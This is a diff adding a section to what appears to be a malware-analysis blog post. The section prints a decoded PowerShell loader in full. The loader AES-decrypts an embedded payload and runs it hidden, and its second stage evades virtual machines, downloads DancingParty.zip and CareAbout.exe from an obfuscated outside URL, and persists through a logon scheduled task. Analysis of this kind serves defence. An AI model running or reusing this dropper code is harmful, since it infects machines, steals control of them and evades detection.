@@ -131,3 +131,76 @@ thI = "-ExecutionPolicy UnRestricted Start-Process 'cmd.exe' -WindowStyle hidden
 
 <br>
 #### 3.3. Powershell Analysis
+
+Below is the manually decoded powershell code. The malware writers seem to have made a big fuss about obfuscating the payload. The payload goes through an AES decryption and GZIP decompression.
+
+{% highlight powershell %}
+
+-ExecutionPolicy UnRestricted 
+Start-Process 'cmd.exe' 
+-WindowStyle hidden 
+-ArgumentList {
+    /c powershell.exe 
+    $encrypted_payload_b64 = 'AAAAAAAAAAAAAAAAAAAAAB8rmY4fHpb8hejK0ZE9i3tYaElNq655jsBvUpIJFHOn1uc5lQj4Be1l49TSquzg8V9DHtUtCrMd/ZLvOZ5NkgFprkRf2UaG9yHpdhtrDzpRJGDiCaS6AmKix+hcVPlXfljynDNLwz4PUrjm3/Sdor7db3fiZeqggtYQ1nZJ0PvDTb8X5h9YqnFjlwoBn1Kqm4xRlS9pDC3e+q5LfaEllwYS3fDB0AAwKPI/yMOz7yjrVypnNiMFBhXUZoMSi+ox9DiNjKffZpwKuOM65JPVP0XcrJcV8KOOpJgJcKDG9vZ3CSubCLFKLsH1ELWlT7y5QL+Lps36DYWEc7iGz7awlYrSf3FxZXhqSovpB3kEqmYTwT+0enYQmdQM4zmp9X0yoUyLABk1ulIFxI6fDOZvPS1O9O6xGsN6FJ6s8Xh0XetS4fb5eIriW1xFNMHegsBR5eL0+YgEQ9ne71pyDETQKk/hLReBWPlE6AaFoL4dx2X5xk6SywdWAXt0IqyWxMcfzoeC+M2doGTtH+ySzoe2zTwn/pBoxoT6VNEDWN7BqJzlYePO/iilhYHFXnYicCPFrkhf7U+sx4KSJnwnpriNduHTVgZqGN2s+fWJj2Ayz9CiMpcrftS/QsGaut+yhZ0aCXT1Ps9TSoh2T29HRUUvHgZQwHHWEDNa9A1kClLqHcL97KrH6Q0VtEYwP4lfTHR1ZS/hQVHQD8DMh9XlzLDhRaeA4k1fxNL5teIwXm3Hp1wFSrjnq26JeuFn84v5BdLQTvUsdSfKCboBvZ5gEJLsedpRyze4LwiWOJjhpngo23nbOTgg85YphqZRG9IJRRtkKz0fR/5NT1gLNKm87OzUiwsjaXM+hGSUrkedK02uPjz8IB03lABwRs2rgeWZfjUhV0+Yfm1NI9OQdR3WqaBHaFVTcRzGz1CTDlN6z+aj+Ywe2JQIsO9254VX35INw6kwDs/HXl5wA/jtzff7KEhFRw6kfThU/T2LjTJCa9/CcOrtvdwVY7r0E30QBUwjStxxZbVRSUESZZjJJ6x2MNwBCf69xADLPlMv+jfGQLKTbQNKqDtsVJmnssYMdGWjhu/3kQFiNxOZZWgRyUHnzkluTMjfHe5mNGF7gpIOY60FIEOagfjWTGEnN5ek/HuzKFshcR0q+QfxbZQY00FY9uSTwPLm9lt1y8/rSVYxBTgI2scFzcOnMNnxUSUdfeKwS/lvNqkfM7BeSWkR0JpodtuSyyMh27yHxpYvw3MWI/a/Ll3ZUxsXup1UzN2WT4BN1bDgR3E38mX5z7e3J9werT9vZFPEqyCxSb3qTIceY//xoTGC38N0BrEEp1UK4MmefVRk9Q==';
+    $aes_key = 'Y0JqV3JldExSbXVlVnJGQVpmQnhMRVJwT3NPbmV6c3I=';
+    $encrypted_payload = [System.Convert]::FromBase64String($encrypted_payload_b64);
+    $aes_iv = $encrypted_payload[0..15];
+
+    $AesManaged = New-Object 'System.Security.Cryptography.AesManaged';
+    $AesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB;
+    $AesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
+    $AesManaged.BlockSize = 128;
+    $AesManaged.KeySize = 256;
+    $AesManaged.Key = [System.Convert]::FromBase64String($aes_key);
+    $AesManaged.IV = $aes_iv;
+
+    $AesDecryptor = $AesManaged.CreateDecryptor();
+    $gzip_payload = $AesDecryptor.TransformFinalBlock($encrypted_payload, 16, $encrypted_payload.Length - 16);
+    $AesManaged.Dispose();
+    
+    $gzip_memory = New-Object System.IO.MemoryStream( , $gzip_payload );
+    $payload_memory = New-Object System.IO.MemoryStream;
+    $gzipstream_obj = New-Object System.IO.Compression.GzipStream $gzip_memory, ([IO.Compression.CompressionMode]::Decompress);
+    $gzipstream_obj.CopyTo( $payload_memory );
+    $gzipstream_obj.Close();
+    $gzip_memory.Close();
+    
+    [byte[]] $barr_utf8_payload = $payload_memory.ToArray();
+    $payload_str = [System.Text.Encoding]::UTF8.GetString($barr_utf8_payload);
+    $payload_str | powershell - 
+}
+
+
+{% endhighlight %} 
+
+<br>
+In the above code, we note that $payload_str is executed by the powershell interpreter. To extract the contents of `$payload_str`, simply run the code in powershell and print `$payload_str`
+
+{% highlight powershell %}
+
+function CYX($xRP, $vBO){[IO.File]::WriteAllBytes($xRP, $vBO)};function Mne($xRP){if ($xRP.E
+ndsWith('.zip') -eq $True){$fwef = '\' + (Get-Item $xRP).Basename; $Script:fghrth = Join-Pat
+h $OHX $fwef;Expand-Archive -Path $xRP -DestinationPath $fghrth; $Script:ghyth = 1; del $xRP
+}else{if ($ghyth -eq 1){mv -Path $xRP -Destination $fghrth; $xRP = Join-Path $fghrth CareAbo
+ut.exe};$Action = (New-ScheduledTaskAction -Execute $xRP);$Trigger = New-ScheduledTaskTrigge
+r -AtLogOn;Register-ScheduledTask -TaskName "BackgroundCheck" -Action $Action -Trigger $Trig
+ger -RunLevel "Highest" -Force;Start $xRP}};function WkR($BCl){$Ijq = New-Object (rbH @(6813
+,6836,6851,6781,6822,6836,6833,6802,6843,6840,6836,6845,6851));[Net.ServicePointManager]::Se
+curityProtocol = [Net.SecurityProtocolType]::TLS12;$vBO = $Ijq.DownloadData($BCl);return $vB
+O};function rbH($rHG){$pef=6735;$NMd=$Null;foreach($pPr in $rHG){$NMd+=[char]($pPr-$pef)};re
+turn $NMd};function ABi(){$OHX = $env:AppData + '\';;;$Uusz = @("VirtualBox", "VMware", "Xen
+", "Bochs","Qemu", "Hyper", "VRTUAL", "Virt", "A M I");$hOzHg = Get-WmiObject Win32_Bios | S
+elect-Object -Property * | Out-String; foreach($bLFGl in $Uusz) {$omfXU = Select-String -Pat
+tern $bLFGl -Input $hOzHg -AllMatches -Quiet;if($omfXU -eq $True) {Exit}};$pvSx = $OHX + 'Da
+ncingParty.zip'; if (Test-Path -Path $pvSx){Mne $pvSx;}Else{ $huPZk = WkR (rbH @(6839,6851,6
+851,6847,6850,6793,6782,6782,6844,6846,6846,6835,6840,6780,6854,6846,6846,6835,6781,6834,684
+6,6844,6782,6854,6847,6780,6834,6846,6845,6851,6836,6845,6851,6782,6852,6847,6843,6846,6832,
+6835,6850,6782,6832,6850,6851,6849,6832,6782,6803,6832,6845,6834,6840,6845,6838,6815,6832,68
+49,6851,6856,6781,6857,6840,6847));CYX $pvSx $huPZk;Mne $pvSx;}$OSoh = $OHX + 'CareAbout.exe
+'; if (Test-Path -Path $OSoh){Mne $OSoh;}Else{ $GOuVJ = WkR (rbH @(6839,6851,6851,6847,6850,
+6793,6782,6782,6844,6846,6846,6835,6840,6780,6854,6846,6846,6835,6781,6834,6846,6844,6782,68
+54,6847,6780,6834,6846,6845,6851,6836,6845,6851,6782,6852,6847,6843,6846,6832,6835,6850,6782
+,6832,6850,6851,6849,6832,6782,6802,6832,6849,6836,6800,6833,6846,6852,6851,6781,6836,6855,6
+836));CYX $OSoh $GOuVJ;Mne $OSoh;};;}ABi;
+
+{% endhighlight %}
